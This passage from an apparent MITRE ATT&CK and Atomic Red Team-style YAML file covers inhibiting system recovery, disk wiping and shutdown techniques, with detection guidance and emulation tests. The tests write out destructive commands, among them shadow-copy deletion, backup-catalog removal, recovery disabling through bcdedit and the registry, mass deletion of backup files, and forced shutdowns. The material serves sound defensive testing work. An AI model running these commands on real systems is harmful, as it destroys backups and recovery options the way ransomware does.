        Monitor the status of services involved in system recovery. Monitor the registry for changes associated with system recovery features (ex: the creation of <code>HKEY_CURRENT_USER\Software\Policies\Microsoft\PreviousVersions\DisableLocalPage</code>).

        For network infrastructure devices, collect AAA logging to monitor for `erase`, `format`, and `reload` commands being run in succession.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      - Network
      - IaaS
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      - 'Snapshot: Snapshot Deletion'
      - 'Windows Registry: Windows Registry Key Modification'
      - 'Cloud Storage: Cloud Storage Deletion'
      - 'Service: Service Metadata'
      - 'File: File Deletion'
      x_mitre_impact_type:
      - Availability
      type: attack-pattern
      id: attack-pattern--f5d8eed6-48a9-4cdf-a3d7-d1ffa99c3d2a
      created: '2019-04-02T13:54:43.136Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1490
        external_id: T1490
      - source_name: Dark Reading Code Spaces Cyber Attack
        description: " Brian Prince. (2014, June 20). Code Hosting Service Shuts Down
          After Cyber Attack. Retrieved March 21, 2023."
        url: https://www.darkreading.com/attacks-breaches/code-hosting-service-shuts-down-after-cyber-attack
      - source_name: FireEye WannaCry 2017
        description: Berry, A., Homan, J., and Eitzman, R. (2017, May 23). WannaCry
          Malware Profile. Retrieved March 15, 2019.
        url: https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html
      - source_name: Talos Olympic Destroyer 2018
        description: Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer
          Takes Aim At Winter Olympics. Retrieved March 14, 2019.
        url: https://blog.talosintelligence.com/2018/02/olympic-destroyer.html
      - source_name: Rhino Security Labs AWS S3 Ransomware
        description: 'Spencer Gietzen. (n.d.). AWS Simple Storage Service S3 Ransomware
          Part 2: Prevention and Defense. Retrieved March 21, 2023.'
        url: https://rhinosecuritylabs.com/aws/s3-ransomware-part-2-prevention-and-defense/
      - source_name: ZDNet Ransomware Backups 2020
        description: Steve Ranger. (2020, February 27). Ransomware victims thought
          their backups were safe. They were wrong. Retrieved March 21, 2023.
        url: https://www.zdnet.com/article/ransomware-victims-thought-their-backups-were-safe-they-were-wrong/
      - source_name: disable_notif_synology_ransom
        description: TheDFIRReport. (2022, March 1). Disabling notifications on Synology
          servers before ransom. Retrieved October 19, 2022.
        url: https://twitter.com/TheDFIRReport/status/1498657590259109894
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1490
    atomic_tests:
    - name: Windows - Delete Volume Shadow Copies
      auto_generated_guid: 43819286-91a9-4369-90ed-d31fb4da2c01
      description: |
        Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon
        execution, if no shadow volumes exist the message "No items found that satisfy the query." will be displayed. If shadow volumes are present, it
        will delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n
        confirmation prompt. Shadow copies can only be created on Windows server or Windows 8.

        https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Create volume shadow copy of C:\ . This prereq command only
          works on Windows Server or Windows 8.

          '
        prereq_command: 'if(!(vssadmin.exe list shadows | findstr "No items found
          that satisfy the query.")) { exit 0 } else { exit 1 }

          '
        get_prereq_command: 'vssadmin.exe create shadow /for=c:

          '
      executor:
        command: 'vssadmin.exe delete shadows /all /quiet

          '
        name: command_prompt
        elevation_required: true
    - name: Windows - Delete Volume Shadow Copies via WMI
      auto_generated_guid: 6a3ff8dd-f49c-4272-a658-11c2fe58bd88
      description: |
        Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
        Shadow copies can only be created on Windows server or Windows 8.
      supported_platforms:
      - windows
      executor:
        command: 'wmic.exe shadowcopy delete

          '
        name: command_prompt
        elevation_required: true
    - name: Windows - wbadmin Delete Windows Backup Catalog
      auto_generated_guid: 263ba6cb-ea2b-41c9-9d4e-b652dadd002c
      description: |
        Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,
        "The backup catalog has been successfully deleted." will be displayed in the PowerShell session.
      supported_platforms:
      - windows
      executor:
        command: 'wbadmin delete catalog -quiet

          '
        name: command_prompt
        elevation_required: true
    - name: Windows - Disable Windows Recovery Console Repair
      auto_generated_guid: cf21060a-80b3-4238-a595-22525de4ab81
      description: |
        Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
        Upon execution, "The operation completed successfully." will be displayed in the powershell session.
      supported_platforms:
      - windows
      executor:
        command: |
          bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
          bcdedit.exe /set {default} recoveryenabled no
        cleanup_command: |
          bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1
          bcdedit.exe /set {default} recoveryenabled yes >nul 2>&1
        name: command_prompt
        elevation_required: true
    - name: Windows - Delete Volume Shadow Copies via WMI with PowerShell
      auto_generated_guid: 39a295ca-7059-4a88-86f6-09556c1211e7
      description: |
        Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.
        This technique is used by numerous ransomware families such as Sodinokibi/REvil.
        Executes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution
        there may be no output displayed.
      supported_platforms:
      - windows
      executor:
        command: 'Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}

          '
        name: powershell
        elevation_required: true
    - name: Windows - Delete Backup Files
      auto_generated_guid: 6b1dbaf6-cc8a-4ea6-891f-6058569653bf
      description: |
        Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many "access is denied" messages will appear as the commands try
        to delete files from around the system.
      supported_platforms:
      - windows
      executor:
        command: 'del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.*
          c:\backup*.* c:\*.set c:\*.win c:\*.dsk

          '
        name: command_prompt
        elevation_required: true
    - name: Windows - wbadmin Delete systemstatebackup
      auto_generated_guid: 584331dd-75bc-4c02-9e0b-17f5fd81c748
      description: 'Deletes the Windows systemstatebackup using wbadmin.exe. This
        technique is used by numerous ransomware families. This may only be successful
        on server platforms that have Windows Backup enabled.

        '
      supported_platforms:
      - windows
      executor:
        command: 'wbadmin delete systemstatebackup -keepVersions:0

          '
        name: command_prompt
        elevation_required: true
    - name: Windows - Disable the SR scheduled task
      auto_generated_guid: 1c68c68d-83a4-4981-974e-8993055fa034
      description: 'Use schtasks.exe to disable the System Restore (SR) scheduled
        task

        '
      supported_platforms:
      - windows
      executor:
        command: 'schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /disable

          '
        cleanup_command: 'schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR"
          /enable >nul 2>&1

          '
        name: command_prompt
        elevation_required: true
    - name: Disable System Restore Through Registry
      auto_generated_guid: 66e647d1-8741-4e43-b7c1-334760c2047f
      description: "Modify the registry of the currently logged in user using reg.exe
        via cmd console to disable system restore on the computer. \nSee how remcos
        RAT abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n"
      supported_platforms:
      - windows
      executor:
        command: |
          reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
          reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
          reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
          reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
        cleanup_command: |
          reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /f >nul 2>&1
          reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /f >nul 2>&1
          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /f >nul 2>&1
          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /f >nul 2>&1
        name: command_prompt
        elevation_required: true
  T1561.001:
    technique:
      modified: '2023-04-12T23:42:59.868Z'
      name: Disk Content Wipe
      description: |-
        Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.

        Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have also been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files.

        To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Look for attempts to read/write to sensitive locations like the partition boot sector or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the <code>\\\\.\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.

        For network infrastructure devices, collect AAA logging to monitor for `erase` commands that delete critical configuration files.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.0'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      - 'Driver: Driver Load'
      - 'Drive: Drive Modification'
      - 'Drive: Drive Access'
      x_mitre_impact_type:
      - Availability
      type: attack-pattern
      id: attack-pattern--fb640c43-aa6b-431e-a961-a279010424ac
      created: '2020-02-20T22:06:41.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1561/001
        external_id: T1561.001
      - source_name: DOJ Lazarus Sony 2018
        description: Department of Justice. (2018, September 6). Criminal Complaint
          - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.
        url: https://www.justice.gov/opa/press-release/file/1092091/download
      - source_name: Novetta Blockbuster Destructive Malware
        description: 'Novetta Threat Research Group. (2016, February 24). Operation
          Blockbuster: Destructive Malware Report. Retrieved March 2, 2016.'
        url: https://web.archive.org/web/20160303200515/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf
      - source_name: Novetta Blockbuster
        description: 'Novetta Threat Research Group. (2016, February 24). Operation
          Blockbuster: Unraveling the Long Thread of the Sony Attack. Retrieved February
          25, 2016.'
        url: https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf
      - source_name: Microsoft Sysmon v6 May 2017
        description: Russinovich, M. & Garnier, T. (2017, May 22). Sysmon v6.20. Retrieved
          December 13, 2017.
        url: https://docs.microsoft.com/sysinternals/downloads/sysmon
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1529:
    technique:
      modified: '2023-03-22T20:45:22.531Z'
      name: System Shutdown/Reboot
      description: |-
        Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A)

        Shutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.

        Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_contributors:
      - Austin Clark, @c2defense
      - Hubert Mank
      x_mitre_deprecated: false
      x_mitre_detection: Use process monitoring to monitor the execution and command
        line parameters of binaries involved in shutting down or rebooting systems.
        Windows event logs may also designate activity associated with a shutdown/reboot,
        ex. Event ID 1074 and 6006. Unexpected or unauthorized commands from network
        cli on network devices may also be associated with shutdown/reboot, e.g. the
        <code>reload</code> command.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Sensor Health: Host Status'
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      x_mitre_impact_type:
      - Availability
      type: attack-pattern
      id: attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc
      created: '2019-10-04T20:42:28.541Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1529
        external_id: T1529
      - source_name: Talos Nyetya June 2017
        description: Chiu, A. (2016, June 27). New Ransomware Variant "Nyetya" Compromises
          Systems Worldwide. Retrieved March 26, 2019.
        url: https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html
      - source_name: alert_TA18_106A
        description: CISA. (2018, April 20). Russian State-Sponsored Cyber Actors
          Targeting Network Infrastructure Devices. Retrieved February 14, 2022.
        url: https://www.cisa.gov/uscert/ncas/alerts/TA18-106A
      - source_name: Talos Olympic Destroyer 2018
        description: Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer
          Takes Aim At Winter Olympics. Retrieved March 14, 2019.
        url: https://blog.talosintelligence.com/2018/02/olympic-destroyer.html
      - source_name: Microsoft Shutdown Oct 2017
        description: Microsoft. (2017, October 15). Shutdown. Retrieved October 4,
          2019.
        url: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1529
    atomic_tests:
    - name: Shutdown System - Windows
      auto_generated_guid: ad254fa8-45c0-403b-8c77-e00b3d3e7a64
      description: 'This test shuts down a Windows system.

        '
      supported_platforms:
      - windows
      input_arguments:
        timeout:
          description: Timeout period before shutdown (seconds)
          type: integer
          default: 1
      executor:
        command: 'shutdown /s /t #{timeout}

          '
        name: command_prompt
        elevation_required: true
    - name: Restart System - Windows
      auto_generated_guid: f4648f0d-bf78-483c-bafc-3ec99cd1c302
      description: 'This test restarts a Windows system.

        '
      supported_platforms:
      - windows
      input_arguments:
        timeout:
          description: Timeout period before restart (seconds)
          type: integer
          default: 1
      executor:
        command: 'shutdown /r /t #{timeout}

          '
        name: command_prompt
        elevation_required: true
    - name: Restart System via `shutdown` - macOS/Linux
      auto_generated_guid: 6326dbc4-444b-4c04-88f4-27e94d0327cb
      description: 'This test restarts a macOS/Linux system.

        '
      supported_platforms:
      - macos
      - linux
      input_arguments:
        timeout:
          description: Time to restart (can be minutes or specific time)
          type: string
          default: now
      executor:
        command: 'shutdown -r #{timeout}

          '
        name: bash
        elevation_required: true
    - name: Shutdown System via `shutdown` - macOS/Linux
      auto_generated_guid: 4963a81e-a3ad-4f02-adda-812343b351de
      description: 'This test shuts down a macOS/Linux system using a halt.

        '
      supported_platforms:
      - macos
      - linux
      input_arguments:
        timeout:
          description: Time to shutdown (can be minutes or specific time)
          type: string
          default: now
      executor:
        command: 'shutdown -h #{timeout}

          '
        name: bash
        elevation_required: true
    - name: Restart System via `reboot` - macOS/Linux
      auto_generated_guid: 47d0b042-a918-40ab-8cf9-150ffe919027
      description: 'This test restarts a macOS/Linux system via `reboot`.

        '
      supported_platforms:
      - macos
      - linux
      executor:
        command: 'reboot

          '
        name: bash
        elevation_required: true
    - name: Shutdown System via `halt` - Linux
      auto_generated_guid: 918f70ab-e1ef-49ff-bc57-b27021df84dd
      description: 'This test shuts down a Linux system using `halt`.

        '
      supported_platforms:
      - linux
      executor:
        command: 'halt -p

          '
        name: bash
        elevation_required: true
    - name: Reboot System via `halt` - Linux
      auto_generated_guid: 78f92e14-f1e9-4446-b3e9-f1b921f2459e
      description: 'This test restarts a Linux system using `halt`.

        '
      supported_platforms:
      - linux
      executor:
        command: 'halt --reboot

          '
        name: bash
        elevation_required: true
    - name: Shutdown System via `poweroff` - Linux
      auto_generated_guid: 73a90cd2-48a2-4ac5-8594-2af35fa909fa
      description: 'This test shuts down a Linux system using `poweroff`.

        '
      supported_platforms:
      - linux
      executor:
        command: 'poweroff

          '
        name: bash
        elevation_required: true
    - name: Reboot System via `poweroff` - Linux
      auto_generated_guid: 61303105-ff60-427b-999e-efb90b314e41
      description: 'This test restarts a Linux system using `poweroff`.

        '
      supported_platforms:
      - linux
      executor:
        command: 'poweroff --reboot

          '
        name: bash
        elevation_required: true
    - name: Logoff System - Windows
      auto_generated_guid: 3d8c25b5-7ff5-4c9d-b21f-85ebd06654a4
      description: 'This test performs a Windows system logoff as seen in [dcrat backdoor
        capabilities](https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor)

        '
      supported_platforms:
      - windows
      executor:
        command: "shutdown /l \n"
        name: command_prompt
        elevation_required: true
